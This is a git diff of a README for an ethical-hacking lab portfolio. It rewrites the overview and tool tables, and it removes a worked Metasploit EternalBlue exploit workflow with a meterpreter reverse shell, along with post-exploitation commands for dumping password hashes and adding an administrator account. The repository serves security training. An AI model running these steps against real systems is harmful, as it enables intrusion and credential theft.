@@ -1,29 +1,62 @@
 # Ethical-hacking-lab-series
 Hands-on network security labs covering enumeration, exploitation (EternalBlue, buffer overflows), malware analysis, web app testing, compliance scanning, and SIEM monitoring — using tools like Nmap, Metasploit, Burp Suite, SQLMap, Cuckoo Sandbox, and Wazuh.
 
-# 🔐 Network Security Lab – Enumeration, Exploitation & Post-Exploitation
+# 🔐 Network Security Labs – A Comprehensive Cybersecurity Simulation
 
-This project simulates real-world network attacks in a controlled virtual lab using **Nmap, NetBIOS tools, and Metasploit**. It walks through enumeration, vulnerability analysis, exploitation, and post-exploitation tasks — focusing on Windows XP and Metasploitable targets.
+This repository presents a broad collection of practical labs simulating real-world cybersecurity scenarios, executed within a controlled and isolated virtual environment. The work spans multiple security domains, from enumeration and exploitation to malware analysis, compliance scanning, and SIEM integration—reflecting the complete lifecycle of a professional red team/blue team engagement.
 
 ---
 
-## 📖 About This Project
+## 📖 Overview
 
-This repository is a collection of my **Network Security & Offensive Security Labs**, completed as part of my academic and independent cybersecurity training. The labs simulate real-world attack and defense scenarios using industry-standard tools and techniques. Each task was performed in a **controlled virtual environment**, ensuring both ethical practices and technical depth.
+These labs were conducted to build hands-on proficiency in offensive and defensive security. The exercises include identifying vulnerabilities, exploiting weaknesses, analyzing malicious behavior, testing web applications, and monitoring threats. Each topic aligns with core principles in penetration testing, vulnerability management, incident response, and system hardening.
+
+Rather than focus on one isolated technique or attack vector, the project brings together a **multi-layered security perspective**. The tasks simulate reconnaissance, attack execution, privilege escalation, and defense assessment—mirroring the steps of a professional penetration test and security audit.
 
 ---
 
 ## ⚙️ Lab Environment
 
-| System         | Role             | IP Address        |
-|----------------|------------------|-------------------|
-| Kali Linux     | Attacker         | ###.###.###.#     |
-| Metasploitable | Vulnerable Host  | ###.###.###.#     |
-| Windows XP     | Legacy Target    | ###.###.###.#     |
- 
+All labs were performed using multiple virtual machines running on VMware Workstation. The systems used for testing include:
+
+| System             | Role/Function            |
+|--------------------|--------------------------|
+| Kali Linux         | Attacker/Toolkit OS      |
+| Metasploitable 2/3 | Vulnerable Linux Hosts   |
+| Windows XP         | Legacy Target OS         |
+| Windows 7          | Mid-generation Target OS |
+| Windows 10         | Modern Target OS         |
+| Ubuntu             | Linux Server Simulation  |
+
 ---
 
-## 🧩 Topics Covered
+## 🧰 Tools & Techniques
+
+| Category                  | Tools/Technologies Used                                                                   |
+|---------------------------|-------------------------------------------------------------------------------------------|
+| Enumeration & Scanning    | Nmap, NetBIOS/NBTScan, DNS Footprinting, SpiderFoot, Maltego                              |
+| Exploitation              | Metasploit Framework, GDB, SQLMap                                                         |
+| Vulnerability Scanning    | Nessus, OpenVAS, Nexpose, Retina, MBSA, Microsoft SCM                                     |
+| Malware Analysis          | Cuckoo Sandbox                                                                            |
+| Web Application Testing   | Burp Suite (SQLi, XSS, CSRF), Manual Injection Testing                                    |
+| Post-Exploitation         | Meterpreter, Privilege Escalation, Lateral Movement Techniques                           |
+| Threat Detection & SIEM   | Wazuh, Event Log Monitoring, Host Intrusion Detection                                     |
+| Security Compliance       | Policy scanning, configuration management, and audit tools                               |
+
+---
+
+## 🎯 Objective
+
+This project was developed to simulate real-world attack and defense situations in a safe, controlled manner. The key objectives include:
+
+- Gaining practical experience in identifying and exploiting vulnerabilities
+- Understanding the tools and workflows used by red teams and security analysts
+- Learning how to detect, analyze, and respond to threats effectively
+- Building a foundational portfolio of hands-on cybersecurity labs
+
+---
+
+## 🧩 Covered Topics
 
 Nmap Enumeration  
 NetBIOS Scanning  
@@ -57,88 +90,18 @@ SIEM
 Threat Detection  
 Post-Exploitation  
 Privilege Escalation  
-Lateral Movement
+Lateral Movement  
+
+> 📌 Note: Documentation for each lab is being added progressively. Refer to the commits and PDFs as they are uploaded.
 
 ---
 
-## 🧪 Project 1: Enumeration Using Nmap & NetBIOS
+## 📄 Documentation
 
-### ✅ Objectives
-- Discover live hosts
-- Identify open ports and services
-- Detect service versions for CVE mapping
-- Extract NetBIOS/SMB information
+The repository will be updated continuously with detailed write-ups, screenshots, command breakdowns, and real execution outputs. Labs are grouped by category and can be explored individually as documentation becomes available.
 
-### 🧰 Tools & Commands
-- `nmap -sn` – Host discovery
-- `nmap -sV -p-` – Full port scan + service version detection
-- `nmap -sC` – Default NSE script scan
-- `nbtscan -v` – NetBIOS details
-- `nmap --script smb-os-discovery.nse` – SMB/OS information
+> ⚠️ **Disclaimer**: All activities were performed within isolated, non-production environments for academic and training purposes only.
 
 ---
 
-## 💣 Project 2: Exploiting Vulnerabilities with Metasploit
-
-### ✅ Objectives
-- Identify and exploit MS17-010 vulnerability (EternalBlue)
-- Gain SYSTEM access via Meterpreter shell
-- Perform post-exploitation tasks (hashdump, privilege escalation, lateral movement)
-
-### 🧰 Key Exploit Workflow
-```bash
-msfconsole
-search ms17_010
-use exploit/windows/smb/ms17_010_psexec
-set RHOST 192.168.217.132
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.217.128
-run
-```
-
-### 🔑 Post-Exploitation Steps
-- `sysinfo` – System information
-- `hashdump` – Extract SAM hashes
-- `net user` – Enumerate users
-- `net localgroup Administrators attacker /add` – Privilege escalation
-- `net view`, `dir \\target\share` – Lateral movement & shared resource access
-
----
-
-## 📌 Key Takeaways
-
-- ✅ Enumerating service versions is critical for CVE-based targeting
-- ✅ Unpatched systems like Windows XP are highly vulnerable
-- ✅ SMBv1 and misconfigured shares expose serious risks
-- ✅ Post-exploitation provides insight into real-world attacker behavior
-
----
-
-## 🛠️ Tools Used
-
-| Tool         | Purpose                          |
-|--------------|----------------------------------|
-| Nmap         | Scanning & enumeration           |
-| NetBIOS/NBTScan | Legacy info gathering         |
-| Metasploit   | Exploitation & payload delivery  |
-| Meterpreter  | Post-exploitation interaction    |
-| GDB          | Binary analysis and debugging    |
-| SQLMap       | Automated SQL injection testing  |
-| Burp Suite   | Web vulnerability scanning       |
-| Nessus       | Vulnerability scanning           |
-| OpenVAS      | Open-source vuln scanning        |
-| Cuckoo Sandbox | Malware behavior analysis       |
-| Wazuh        | SIEM/log analysis and detection  |
-| SpiderFoot   | Automated OSINT & recon          |
-| Maltego      | Infrastructure mapping and OSINT |
-
----
-
-## 📄 Report
-The full lab report is included in this repo as a PDF. It contains screenshots, commands used, and detailed output for every step.
-
-> ⚠️ **Disclaimer**: All tasks were performed in an isolated lab for educational purposes only.
-
----
-
-**#CyberSecurity #EthicalHacking #PenetrationTesting #Metasploit #Nmap #WindowsXP #EternalBlue #CTF #Infosec #RedTeam #LabProject**
+**#CyberSecurity #EthicalHacking #OffensiveSecurity #RedTeam #BlueTeam #NetworkSecurity #SIEM #PenetrationTesting #LabProject #InfoSec**
